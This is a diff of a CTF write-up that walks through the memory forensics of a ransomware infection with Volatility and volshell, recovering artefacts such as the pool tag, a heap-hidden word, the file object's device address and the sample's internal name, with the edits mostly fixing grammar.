 [![47](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/47.PNG)](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/47.PNG)
 
-then we can get the kernel address of the process `0xffffba03419b7800` we can use a good trick to convert it to physical offset. by using `addrspace().vtop()`.
+Then we can get the kernel address of the process `0xffffba03419b7800`. We can use a good trick to convert it to physical offset. by using `addrspace().vtop()`.
 
 ```
 $ echo "hex(addrspace().vtop(0xffffba03419b7800))" | vol.py -f memory.dmp --profile=Win2016x64_14393 volshell
@@ -369,7 +369,7 @@ Welcome to volshell! Current memory image is:
 To get help, type 'hh()'
 >>> '0x22e46800L'
 ```
-then we now got the physical offset `0x22e46800`.so now we need to know the size of the `Optional_headers` we can do that by subtracting `_OBJECT_HEADER` size = 0x30 bytes from the physical offset. and we will use `space=addrspace().base` as we deal here with physical offset not virtual offset `addrspace()`.
+Then we got the physical offset `0x22e46800`.so now we need to know the size of the `Optional_headers` we can do that by subtracting `_OBJECT_HEADER` size = 0x30 bytes from the physical offset. and we will use `space=addrspace().base` as we deal here with physical offset not virtual offset `addrspace()`.
 
 ```
 >>> dt("_OBJECT_HEADER", 0x22e46800-0x30 , space=addrspace().base)
@@ -399,7 +399,7 @@ then we now got the physical offset `0x22e46800`.so now we need to know the size
 0x30  : Body                           585394176
 >>> 
 ```
-then we can see that InfoMask value = 0x8 which will help us to detect the size of `Optional_headers` which is equivalent to Quota Info and its size = 32 bytes.
+Then we can see that InfoMask value = 0x8, which will help us to detect the size of `Optional_headers` which is equivalent to Quota Info, and its size = 32 bytes.
 
 [![48](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/48.PNG)](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/48.PNG)
 
@@ -419,7 +419,7 @@ then to go to the pool_header we need to subtract = - 0x30 (_OBJECT_HEADER) - 0x
 0xa   : PoolTagHash                    19145
 >>> 
 ```
-then we will convert it to a 4-byte string then reverse the string we will get the answer.
+then we will convert it to a 4-byte string, then reverse it. We will get the answer.
 
 ```
 >>> print (long_to_bytes(1280133197)[::-1])
@@ -429,7 +429,7 @@ Flag : <span style="color: #909090">MHML</span>
 
 # #27	What is the address where the ransomware stored the 567-byte key under the malicious process' memory?
 
-for this qustion we can use `yarascan` plugin , PID of the Process and after searching on google we can find a usfull Sentence that we can use as a strings to get the address of the key which is `When you open our website `. then we will see the name of the rule ,the memory address ,process name and process ID.
+For this question, we can use the `yarascan` plugin, PID of the Process, and after searching on google we can find a helpful Sentence that we can use as a string to get the address of the key, which is `When you open our website `. Then we will see the rule's name, the memory address, process name, and process ID.
 
 [![49](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/49.PNG)](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/49.PNG)
 
@@ -461,7 +461,7 @@ Flag : <span style="color: #909090">0x00b5f4a5</span>
 
 # #28	What is the 8-byte word hidden in the ransomware process's memory?
 
-so we can think about this as it might be hidden in Heap. so what is Process Heap? it is an area of pre-reserved computer main storage ( memory ) that a program process can use to store data in some variable amount that won't be known until the program is running. then we will use volshell and set the context at the process `3140`.we can use another way by Printing active processes in a table view using `ps()` then we can get the virtual address of the process `0xffffba03419b7800` then we can use cc(0xffffba03419b7800) to make the current context at `svchost.exe`.
+So we can think about this as it might be hidden in Heap. So what is Process Heap? It is an area of pre-reserved computer main storage ( memory ) that a program process can use to store data in some variable amount that won't be known until the program runs. Then we will use volshell and set the context at the process `3140`.we can use another way by Printing active processes in a table view using `ps()`. Then we can get the virtual address of the process `0xffffba03419b7800`. Then we can use cc(0xffffba03419b7800) to make the current context at `svchost.exe`.
 
 ```
 >>> ps()
@@ -517,7 +517,7 @@ wsmprovhost.ex   1632   860    0xffffba033f4a7080
 Current context: svchost.exe @ 0xffffba03419b7800, pid=3140, ppid=1632 DTB=0x2f3e8000
 ```
 
-then we need to know how many heaps that process contains so we can use `proc().Peb.ProcessHeaps.dereference()` to get the address of the heaps. we will find two `10420224,65536` then we can go to each of them using db() which can use to display as canonical hex dump. nothing found in `10420224`.so let's try with the other one.
+Then we need to know how many heaps that process contains so we can use `proc().Peb.ProcessHeaps.dereference()` to get the address of the heaps. We will find two `10420224,65536` then we can go to each of them using db(), which can use to display as canonical hex dump. Nothing found in `10420224`.so let's try with the other one.
 
 ```
 >>> db(10420224)
@@ -541,13 +541,13 @@ then we need to know how many heaps that process contains so we can use `proc().
 0x00010060  e0 0f 01 00 00 00 00 00 e0 0f 01 00 00 00 00 00   ................
 0x00010070  00 80 00 00 00 00 00 00 00 00 00 00 00 00 10 00   ................
 ```
-then we will find it. 
+Then we will find it. 
 
 Flag : <span style="color: #909090">c0n6r475</span>
 
 # #29	What is the virtual address of the device where the ransomware file where opened?
 
-First, we need to know about FILE_OBJECT. The FILE_OBJECT structure is used by the system to represent a file object. To user-mode protected subsystems, a file object represents an open instance of a file, device, directory, or volume. To device and intermediate drivers, a file object usually represents a device object.
+First, we need to know about FILE_OBJECT. The system uses the FILE_OBJECT structure to represent a file object. To user-mode protected subsystems, a file object represents an open instance of a file, device, directory, or volume. A file object usually represents a device object to the device and intermediate drivers.
 
 ```
 typedef struct _FILE_OBJECT {
@@ -583,7 +583,7 @@ typedef struct _FILE_OBJECT {
   __volatile PVOID                  FileObjectExtension;
 } FILE_OBJECT, *PFILE_OBJECT;
 ```
-so what we need is `DeviceObject` which is A pointer to the device object on which the file is opened as asked in the question. so how to get that ? we need first to get the offset of the file using `filescan` plugin. but then we will find that there is too many files with name `svchost.exe` so we can get it another way using `dumpfiles` plugin and specify the PID of the process then it will dump all files associated with this process.then we can get that.
+So we need 'DeviceObject', a pointer to the device object on which the file is opened as asked in the question. So how to get that? We need first to get the file offset using the `filescan` plugin. But then we will find that there are too many files with the name `svchost.exe`, so we can get it another way using the `dumpfiles` plugin and specify the PID of the process. Then it will dump all files associated with this process. Then we can get that.
 
 ```
 $ vol.py -f memory.dmp --profile=Win2016x64_14393 dumpfiles -p 3140 --dump-dir=./
@@ -607,7 +607,7 @@ ImageSectionObject 0xffffba033f4cb080   3140   \Device\HarddiskVolume4\Windows\S
 ImageSectionObject 0xffffba033eb16700   3140   \Device\HarddiskVolume4\Windows\System32\wow64cpu.dll
 DataSectionObject 0xffffba033eb16700   3140   \Device\HarddiskVolume4\Windows\System32\wow64cpu.dll
 ```
-now we have the offset of the process so let's go to volshell again to get the DeviceObject from the FILE_OBJECT structure. we can do that after starting volshell then we will use dt() which can use to describe an object or show type info then we can pass to it FILE_OBJECT to list it for the file `svchost.exe` with the offset that we got `0xffffba033f477bc0`.
+now we have the process offset, so let's go to volshell again to get the DeviceObject from the FILE_OBJECT structure. we can do that after starting volshell. Then we will use dt(), which can use to describe an object or show type info. Then we can pass FILE_OBJECT to list it for the file `svchost.exe` with the offset that we got `0xffffba033f477bc0`.
 
 ```
 >>> dt('_FILE_OBJECT' ,0xffffba033f477bc0)
@@ -644,13 +644,13 @@ now we have the offset of the process so let's go to volshell again to get the D
 0xd0  : FileObjectExtension            0
 ```
 
-then we will get DeviceObject but we need to convert it to hex then we got our answer.
+Then we will get DeviceObject, but we need to convert it to hex to get our answer.
 
 Flag : <span style="color: #909090">0xffffba033e631460</span>
 
 # #30	What is the physical address where the ransomware file is stored in memory?
 
-we can got it using volshell after finding the offset that we find previously of the malicious file `svchost.exe` and converting it from virtual to physical using `addrspace().vtop(V.address)` i will use the trick that i used previously to convert it to hex in one step.
+We can get it using volshell after finding the offset that we saw previously of the malicious file `svchost.exe` and converting it from virtual to physical using `addrspace().vtop(V.address)` i will use the trick that I used previously to convert it to hex in one step.
 
 ```
 $ echo "hex(addrspace().vtop(0xba033f477bc0))" | python2.7 vol.py -f /memory.dmp --profile=Win2016x64_14393 volshell
@@ -666,7 +666,7 @@ Flag : <span style="color: #909090">0x13c090bc0</span>
 
 # #31	What is the ransomware file's internal name?
 
-so we know have the physical offset `0x13c090bc0` we can dump the file using dumpfiles plugin with the physical offset we got `0x13c090bc0` and specify the dump directory.
+So we now have the physical offset `0x13c090bc0`. We can dump the file using the dumpfiles plugin with the physical offset we got `0x13c090bc0` and specify the dump directory.
 
 ```
 $ vol.py -f memory.dmp --profile=Win2016x64_14393 dumpfiles --physoffset=0x13c090bc0 --dump-dir=./
@@ -677,15 +677,15 @@ SharedCacheMap 0x13c090bc0   None   \Device\HarddiskVolume4\Users\Administrator\
 ```
 [![50](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/50.PNG)](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/50.PNG)
 
-so we need first to know that the question asks for FileVersionInfo.InternalName Property which include string vlaue which holds The internal name of the file. If none exists, this property will contain the original name of the file without the extension. so we can find that with using Resource Hacker. then after we go to Resource Hacker and upload `file.None.0xffffba033f565910.dat` to it then we go to the Version Info Section which holds tha internal name that we need then we will find it.
+So we need first to know that the question asks for FileVersionInfo.InternalName Property includes a string value that holds The internal name of the file. If none exists, this property will contain the file's original name without the extension. So we can find that by using Resource Hacker. After we go to Resource Hacker and upload `file.None.0xffffba033f565910.dat` to it, we go to the Version Info Section, which holds the internal name we need. Then, we will find it.
 
 [![51](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/51.PNG)](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/51.PNG)
 
 Flag : <span style="color: #909090">calimalimodumator.exe</span>
 
-# #32	Analyzing the ransomware file. what is the API used to get the geographical location?
+# #32	Analyzing the ransomware file. What is the API used to get the geographical location?
 
-we can solve this questions by using the great tool made by my friend Abdelrahman Nasr (T1m3-m4ch1n3) ❤️ which is used for doing a basic static analysis to a PE file with a colorful CLI that i like alot :D. then after we pass the exe to it will extract the APIs from it then we can get our answer.
+We can solve these questions using the great tool by my friend Abdelrahman Nasr (T1m3-m4ch1n3) ❤️ which is used for a basic static analysis of a PE file with a colorful CLI I like a lot:D. then after we pass the exe to it will extract the APIs from it, we can get our answer.
 
 [![52](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/52.PNG)](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/52.PNG)
 
@@ -705,7 +705,7 @@ Flag : <span style="color: #909090">GetLocaleInfoA</span>
 [Schtasks.exe - Win32 apps](https://docs.microsoft.com/en-us/windows/win32/taskschd/schtasks)  
 [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053/005/)  
 [Memory Forensics](https://icegrave0391.github.io/2020/03/07/memfor/)  
-[volshell CheatSheet by 0xMohammed and mohamed labib](https://github.com/0xMohammed/MISC/blob/main/CheatSheet/volshell.pdf)  
+[volshell CheatSheet by 0xMohammed and Mohamed labib](https://github.com/0xMohammed/MISC/blob/main/CheatSheet/volshell.pdf)  
 [DeepDive Challenge from cyberdefenders](https://detectivestrings.github.io/walkthrough/cyberdefenders/memory%20forensics/dfir/DeepDive/#9--what-is-the-pooltag-of-the-malicious-process-in-ascii)  
 [DarkSide Ransomware](https://www.pcrisk.com/removal-guides/18504-darkside-ransomware)  
 [FileVersionInfo.InternalName Property](https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.fileversioninfo.internalname?view=net-6.0)  
